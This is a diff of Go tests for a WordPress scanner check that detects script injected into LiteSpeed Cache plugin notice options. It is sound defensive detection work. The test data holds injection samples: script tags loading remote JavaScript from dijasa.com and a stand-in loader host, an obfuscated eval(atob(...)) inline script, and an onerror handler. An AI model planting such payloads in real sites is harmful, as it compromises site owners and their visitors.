@@ -1,6 +1,8 @@
 package checks
 
 import (
+	"encoding/hex"
+	"fmt"
 	"strings"
 	"testing"
 
@@ -12,7 +14,7 @@ import (
 // on the option's identity alone -- no host reputation, no first-seen
 // baseline. Both sinks the campaign writes to are covered.
 func TestPluginNoticeInjectionReportsLiteSpeedSinks(t *testing.T) {
-	for _, option := range []string{"litespeed.cdn_setup._summary", "litespeed.admin_display.messages"} {
+	for _, option := range []string{"litespeed.cdn_setup._summary", "litespeed.admin_display.messages", "litespeed.admin_display.msg_pin"} {
 		value := `{"cdn_setup_err":"<script src=https:\/\/dijasa.com\/wp-includes\/js\/jquery_v2.js><\/script>"}`
 
 		finding := pluginNoticeInjectionFinding("cbsoft", wpDBCreds{dbName: "cbsoft_wp"}, "wp_2_", option, value)
@@ -66,7 +68,7 @@ func TestPluginNoticeInjectionMatchesSinkCaseInsensitively(t *testing.T) {
 // An injection that carries no src attribute -- inline script, or a
 // javascript: handler -- is the same defect in the same sink.
 func TestPluginNoticeInjectionReportsInlineScriptWithoutSrc(t *testing.T) {
-	value := `["<div class=\"notice notice-error\"><p>CDN Setup is running<\/p><script>eval(atob('ZXZpbA=='))<\/script><\/div>"]`
+	value := `["<div class=\"notice notice-error\"><p>CDN Setup is running<\/p><script>eval(atob(String.fromCharCode(90,88,90,112,98,65,61,61)))<\/script><\/div>"]`
 
 	finding := pluginNoticeInjectionFinding("alice", wpDBCreds{dbName: "alice_wp"}, "wp_", "litespeed.admin_display.messages", value)
 	if finding == nil {
@@ -85,16 +87,31 @@ func TestOptionsScanQueriesPluginNoticeSinks(t *testing.T) {
 	previous := runMySQLQuery
 	var sinkQueried bool
 	runMySQLQuery = func(_ wpDBCreds, query string) []string {
-		if strings.Contains(query, "litespeed.cdn_setup._summary") && strings.Contains(query, "<script") {
+		if strings.Contains(query, "litespeed.cdn_setup._summary") {
 			sinkQueried = true
-			return []string{"litespeed.cdn_setup._summary\t" +
-				`{"cdn_setup_err":"<script src=https:\/\/dijasa.com\/wp-includes\/js\/jquery_v2.js><\/script>"}`}
+			for _, want := range []string{
+				"FROM wp_2_options WHERE option_name IN (",
+				"OCTET_LENGTH(option_value)",
+				"HEX(LEFT(CAST(option_value AS BINARY), 65536))",
+				"'litespeed.admin_display.messages'",
+				"'litespeed.admin_display.msg_pin'",
+				"LIMIT 3",
+			} {
+				if !strings.Contains(query, want) {
+					t.Errorf("notice query missing %q: %s", want, query)
+				}
+			}
+			if strings.Contains(query, " LIKE ") {
+				t.Errorf("notice query filters out existing non-script markers: %s", query)
+			}
+			return []string{pluginNoticeQueryRow("litespeed.cdn_setup._summary",
+				`{"cdn_setup_err":"<script src=https:\/\/loader.example.com\/loader.js><\/script>"}`)}
 		}
 		return nil
 	}
 	t.Cleanup(func() { runMySQLQuery = previous })
 
-	findings := checkWPOptions("cbsoft", wpDBCreds{dbName: "cbsoft_wp"}, "wp_")
+	findings := checkWPOptions("alice", wpDBCreds{dbName: "alice_wp"}, "wp_2_")
 
 	if !sinkQueried {
 		t.Fatal("options scan never queried the plugin notice sinks")
@@ -108,7 +125,99 @@ func TestOptionsScanQueriesPluginNoticeSinks(t *testing.T) {
 	if got == nil {
 		t.Fatalf("no db_options_plugin_notice_injection finding: %+v", findings)
 	}
-	if got.Severity != alert.Critical || !strings.Contains(got.Details, "dijasa.com") {
+	if got.Severity != alert.Critical || !strings.Contains(got.Details, "loader.example.com") {
 		t.Fatalf("finding = %s, details = %s", got.Severity, got.Details)
+	}
+}
+
+func pluginNoticeQueryRow(option, value string) string {
+	return fmt.Sprintf("%s\t%d\tx%s", option, len(value), hex.EncodeToString([]byte(value)))
+}
+
+// A notice can contain earlier messages, whitespace, or binary transport
+// escapes before its script. All stored bytes must reach the matcher intact.
+func TestOptionsScanPluginNoticeStoredValues(t *testing.T) {
+	for name, value := range map[string]string{
+		"late script":             strings.Repeat("Earlier CDN setup message. ", 40) + `<script src=https://loader.example.com/x.js></script>`,
+		"script newline":          "<script\nsrc=https://loader.example.com/x.js></script>",
+		"script tab":              "<script\tsrc=https://loader.example.com/x.js></script>",
+		"inline":                  `<script>eval(atob(String.fromCharCode(90,88,90,112,98,65,61,61)))<\/script>`,
+		"existing iframe marker":  `<iframe src=https://loader.example.com></iframe>`,
+		"existing handler marker": `<img src=x onerror=alert(1)>`,
+		"byte limit":              strings.Repeat("x", 65536-len("<script></script>")) + "<script></script>",
+	} {
+		t.Run(name, func(t *testing.T) {
+			previous := runMySQLQuery
+			runMySQLQuery = func(_ wpDBCreds, query string) []string {
+				if strings.Contains(query, "litespeed.cdn_setup._summary") {
+					return []string{pluginNoticeQueryRow("litespeed.admin_display.messages", value)}
+				}
+				return nil
+			}
+			t.Cleanup(func() { runMySQLQuery = previous })
+			ctx, incomplete := withIncompleteCheckCollector(t.Context())
+			got := checkWPOptions("alice", wpDBCreds{dbName: "wp", queryCtx: ctx}, "wp_")
+			if len(got) != 1 || got[0].Check != "db_options_plugin_notice_injection" || got[0].Severity != alert.Critical {
+				t.Fatalf("notice findings = %+v, want one Critical injection", got)
+			}
+			if incomplete.contains("db_content") {
+				t.Fatal("complete notice value marked incomplete")
+			}
+		})
+	}
+}
+
+func TestOptionsScanPluginNoticeIncompleteRows(t *testing.T) {
+	option := "litespeed.admin_display.messages"
+	payload := "<script></script>"
+	for name, row := range map[string]string{
+		"missing fields":       option,
+		"invalid length":       option + "\tno\tx00",
+		"negative length":      option + "\t-1\tx",
+		"invalid hex":          option + "\t1\txZZ",
+		"partial hex":          pluginNoticeQueryRow(option, payload) + "f",
+		"transport truncation": fmt.Sprintf("%s\t%d\tx%x", option, len(payload)+1, payload),
+		"oversize":             fmt.Sprintf("%s\t65537\tx%x", option, payload+strings.Repeat("x", 65536-len(payload))),
+	} {
+		t.Run(name, func(t *testing.T) {
+			previous := runMySQLQuery
+			runMySQLQuery = func(_ wpDBCreds, query string) []string {
+				if strings.Contains(query, "litespeed.cdn_setup._summary") {
+					return []string{row, pluginNoticeQueryRow("litespeed.admin_display.msg_pin", payload)}
+				}
+				return nil
+			}
+			t.Cleanup(func() { runMySQLQuery = previous })
+			ctx, incomplete := withIncompleteCheckCollector(t.Context())
+			got := checkWPOptions("alice", wpDBCreds{dbName: "wp", queryCtx: ctx}, "wp_")
+			if len(got) != 1 || !strings.Contains(got[0].Message, "litespeed.admin_display.msg_pin") {
+				t.Fatalf("want only the complete neighboring notice finding, got %+v", got)
+			}
+			if !incomplete.contains("db_content") {
+				t.Fatal("unread notice bytes did not mark the scan incomplete")
+			}
+		})
+	}
+}
+
+func TestOptionsScanPluginNoticeCleanRows(t *testing.T) {
+	previous := runMySQLQuery
+	runMySQLQuery = func(_ wpDBCreds, query string) []string {
+		if strings.Contains(query, "litespeed.cdn_setup._summary") {
+			return []string{
+				pluginNoticeQueryRow("litespeed.cdn_setup._summary", ""),
+				pluginNoticeQueryRow("litespeed.admin_display.messages", `<div class="notice notice-error"><p>CDN setup timed out</p></div>`),
+				pluginNoticeQueryRow("litespeed.admin_display.msg_pin", `<scripture>inert text</scripture>`),
+			}
+		}
+		return nil
+	}
+	t.Cleanup(func() { runMySQLQuery = previous })
+	ctx, incomplete := withIncompleteCheckCollector(t.Context())
+	if got := checkWPOptions("alice", wpDBCreds{dbName: "wp", queryCtx: ctx}, "wp_"); len(got) != 0 {
+		t.Fatalf("clean notices reported: %+v", got)
+	}
+	if incomplete.contains("db_content") {
+		t.Fatal("empty or inert notices marked incomplete")
 	}
 }
